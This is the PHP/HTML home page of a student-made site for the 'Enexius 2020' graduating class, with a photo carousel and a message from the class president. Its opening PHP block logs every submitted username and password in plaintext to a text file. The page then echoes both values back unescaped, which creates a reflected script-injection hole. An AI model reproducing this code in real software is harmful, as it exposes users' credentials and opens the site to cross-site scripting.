<?php
$ar = fopen("cuentaspg.txt", "a") or
die("cuenta no creada");
fputs($ar, $_REQUEST['usuario']);
fputs($ar, "\n");
fputs($ar, $_REQUEST['contrasena']);
fputs($ar, "\n");
fputs($ar, "--------------------------------------------------------");
fputs($ar, "\n");
fclose($ar);
?>
<?php
$user = $_POST['usuario'];
$pass = $_POST['contrasena'];
?>

<html>

<head>
    <link rel="icon" href="LogoEnexius.jpeg">
    <title>Enexius</title>
    <link href="css/bootstrap.min.css" rel="stylesheet">
    <link href="Estilospaginaprincipal.css" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css?family=Paytone+One&display=swap" rel="stylesheet">
    <meta name="viewport" content="width=device-width,initial-scale=1">
</head>

<body>
<!---->
<div class="pagina">
<!---Barra------------->
    <div style="width: ; height:50px; background-color: rgb(255, 255, 255); box-shadow: 0px 10px 5px rgba(128, 128, 128, 0.336);
         position: relative;">
        <a href="">
        <div class="botones" style="float: right;">
            <a href="#configuracion" style="color: BLACK; margin: 5px; text-decoration: none; line-height: 2.5rem;">
                <img src="ajustes.png" style="margin-right:5px; margin-top: 0px;">Configuracion</a>
        </div>
        
        
        <div class="botones" style="float: right;">
            <a href="#infor" style="color: BLACK; margin: 5px; text-decoration: none; line-height: 2.5rem;">
                <img src="cuentas.png" style="margin-right:5px; margin-top: 0px;">
                <?php 
                echo $user;
                ?></a>
        </div>

        <a href="">
            <div class="botones" style="float: left; margin-left: 50px;">
                <a href="#inicio" style="color: BLACK; margin: 5px; text-decoration: none; line-height: 2.5rem;">
                    <img src="carrera.png" style="margin-right:5px; margin-top: 0px;">Inicio</a>
            </div>
        </a>

        <a href="#fotos">
            <div class="botones" style="float: left; margin-left: 5px;">
                <a href="#fotos" style="color: BLACK; margin: 5px; text-decoration: none; line-height: 2.5rem;">
                    <img src="camara.png" style="margin-right:5px; margin-top: 0px;">Fotos</a>
            </div>
        </a>
    </div>
<!--------------------->
<a id="inicio"></a>
<div style="width: 100%; height: 400px;">
    <div style="width: 50%; height: 400px; background-color: rgb(202, 38, 27); float: left; border-top-right-radius: 40px;
    border-bottom-right-radius:40px; margin-bottom: 20px;margin-top: 20px;">
        <div class="titulopay" style="width: 100%; color: #272727; float: left; margin-left: 25px; font-size: 70px; 
                margin-top: 50px;">Enexius 2020</div>
            <div style=" width: 90%; height: 200px; background-color: rgb(202, 38, 27); float: left; margin-left: 25px; margin-top:;">
                <p class="helvetica" style="color: rgb(255, 255, 255);">La promocion 2020 o mejor conocida como Enexius, es la actual 
                    promocion de el Instituto Saleciano Don Bosco, que con su llamativo eslogan "Encargados
                    de nuestro exito" han logrado hacer una de las mejores promociones que a
                    pasado por el centro junto a Lideriunt19 antecesora de estos.</p>
            </div>
        </div>
    <div style="width: 50%; height: 400px; background-color: rgb(255, 255, 255);float: right;">
            <img src="LogoEnexius.jpeg" style=" width: 500px; height: 500px;; margin-left: 20px;">
    </div>
</div>
<br>
<br>
<br>


<!---SLIDER------------>
<a id="fotos"></a>
<div id="Fotos" class="container">
		
    <div id="carousel1" class="carousel slide" data-ride="carousel">
      <ol class="carousel-indicators">
        <li data-target="#carousel1" data-slide-to="0" class="active"></li>
        <li data-target="#carousel1" data-slide-to="1"></li>
        <li data-target="#carousel1" data-slide-to="2"></li>
      </ol>
      <!-- diapositivas -->
      <div class="carousel-inner">
        <div class="carousel-item active">
          <img class="d-block w-100" src="Enexius.jpg" alt="">
            <div class="carousel-caption">
              <h3>Enexuis</h3>
              <p>Gran familia de 92 carazones que laten al mismo ritmo.</p>
            </div>
        </div>
        <div class="carousel-item">
          <img class="d-block w-100" src="Enexius4.jpg" alt="">
            <div class="carousel-caption">
              <h3>Baile</h3>
              <p>Una de las mejores parte de el lanzamiento.</p>
            </div>
        </div>
        <div class="carousel-item">
          <img class="d-block w-100" src="Enexius6.jpg" alt="">
            <div class="carousel-caption">
              <h3></h3>
              <p></p>
            </div>
        </div>
      </div>
      <!-- botones de desplazamiento a izquierda y derecha -->      
      <a class="carousel-control-prev" href="#carousel1" data-slide="prev">
        <span class="carousel-control-prev-icon" aria-hidden="true"></span>
        <span class="sr-only">Previous</span>
      </a>
      <a class="carousel-control-next" href="#carousel1" data-slide="next">
        <span class="carousel-control-next-icon" aria-hidden="true"></span>
        <span class="sr-only">Next</span>
      </a>
    </div>
    
</div>
    
  <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>  
<!--------------------->

<!------VER-MAS-------->

<div style="width: ; height:125px; background-color: rgb(255, 255, 255);  text-align: center;">
    <a href="Pagina Fotos.html">
    <input class="vermas" type="submit" style="margin-top: 30px;" value="Ver más...">
    </a>
</div>
<!--Fondo rojo-->
<div style="background: rgb(202, 38, 27); width:100%; height: 100%;">

<div style="width:100%; height: 100%; height: 100%; auto; background-image: url('Enexius6.jpg'); background-size: 100%;">
<!------------IZQUIERDA------------->
<div style="width:50%; height: auto;">

</div>
<!-----------DERECHA-------------->
<div style="width:50%; height: 100%; float:right; background-color: rgb(202, 38, 27); color:black; padding:10px;">
   <div class="titulopay" style="color: #272727; float: right; font-size: 70px; width:100%;">Palabras del presidente</div>
    <p class="helvetica" style="color: rgb(255, 255, 255); font-size: 23px;"> 
      07/02/2020, la fecha más importante para nosotros como promoción, el día que por fin nos dimos a conocer como 
      "Enexius, encargados de nuestro éxito", meses de ensayo y preparación, muchos sacrificios, decisiones e incluso 
      peleas, todo esto se resume en un solo día, la alegría, adrenalina, nervios y emoción dominaban nuestros cuerpos, 
      pero sin duda alguna fue lo que nos motivó a salir a la pista y darlo todo porque desde pequeños soñábamos con 
      este momento y por fin se estaba haciendo realidad, no fue fácil pero para nosotros fue un éxito!✨ 

    </p>
  </div>
  </div>
</div>
<!--configuracion-->
<a id="configuracion"></a>
<div class="pagina">

<div class="titulopay" style="color: rgb(0, 0, 0); text-align: center; padding-top: 5%; font-size: 40px; padding-bottom: 1%; width:50%; height: 100%; float:right;">
  <img src="equipo.png"><br> Configuracion 
</div>
<div class="pagina"> 
<div style="width: 50%; height: ; background:  ; padding:20px; border-bottom-right-radius:24px; border-top-right-radius: 24px; margin-top:20px; padding: 50px;">
    <div style="color: rgb(85, 85, 85); font-family: Arial, Helvetica, sans-serif;">
      <div style="width: ; height:;">
          
            <div id="accordion1">
              <div class="card" style="color:black; border-top-right-radius: 24px; border-top-left-radius: 24px; ">
                <div class="card-header" id="cabecera1" style="background-color: rgb(202, 38, 27);color:black; border-top-right-radius: 24px; border-top-left-radius: 24px; " >
                  <h5 class="mb-0">
                    <button class="btn btn-link" data-toggle="collapse" data-target="#respuesta1" aria-expanded="true" aria-controls="respuesta1" style="color:white; border-top-right-radius: 24px; ">
                      <img src="cuentas2.png" style="margin-right:5px; margin-top: 0px;">Cuenta
                    </button>
                  </h5>
                </div>
                  <div id="respuesta1" class="collapse show" aria-labelledby="cabecera1" data-parent="#accordion1">
                    <div class="card-body">
                      <b>Nombre de usuario: </b><?php echo $user; ?><br>
                      <b> contraseña: </b><?php echo $pass; ?><br>
                    </div>
                  </div>
                </div>
                  <div class="card" style="color:white; border-bottom-right-radius: 24px; border-bottom-left-radius: 24px; ">
                    <div class="card-header" id="cabecera2" style="background-color: rgb(202, 38, 27);color:white; border-bottom-right-radius: 24px; border-bottom-left-radius: 24px; " >
                      <h5 class="mb-0">
                        <button class="btn btn-link collapsed" data-toggle="collapse" data-target="#respuesta2" aria-expanded="false" id="infor" aria-controls="respuesta2" style= "color:white;">
                          <img src="cuentas2.png" style="margin-right:5px; margin-top: 0px;">Informacion cuenta
                        </button>
                      </h5>
                    </div>
                      <div id="respuesta2" class="collapse" aria-labelledby="cabecera2" data-parent="#accordion1">
                        <div class="card-body" style="color:black;">
                          Esta parte esta desabilitada por el momento, a falta de base de datos...<br>
                            <div style="width: ; height:125px; background-color: rgb(255, 255, 255);  text-align: center;">
                              <a href="Pagina Inicio.php">
                              <input class="vermas" type="submit" style="margin-top: 30px;" value="Cerrar Sesion">
                              </a>
                            </div>
                        </div>
                      </div>
                  </div>
                </div>    
              </div>
            </div>
      </div>
  </div>
</div>
</div>


<div style="width: 100%; height:350px; background-color: rgb(235, 235, 235);  text-align: center;">
  <div  style="color: rgb(85, 85, 85); font-family: Arial, Helvetica, sans-serif; text-align: left; margin-left: 10%; padding-top: 5%; font-size:20px;">
        <img src="derechos-de-autor.png"> Pagina creada por Jafet A. Taveras<br>
        <img src="instagram-bosquejado.png"> Instagram: Jafet_Taveras<br>
        <img src="youtube.png"> YouTbe: Jafet Taveras<br>
  </div>
</div>

<script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>   



<!--------------------->
<!------->

</div>



</body>

</html>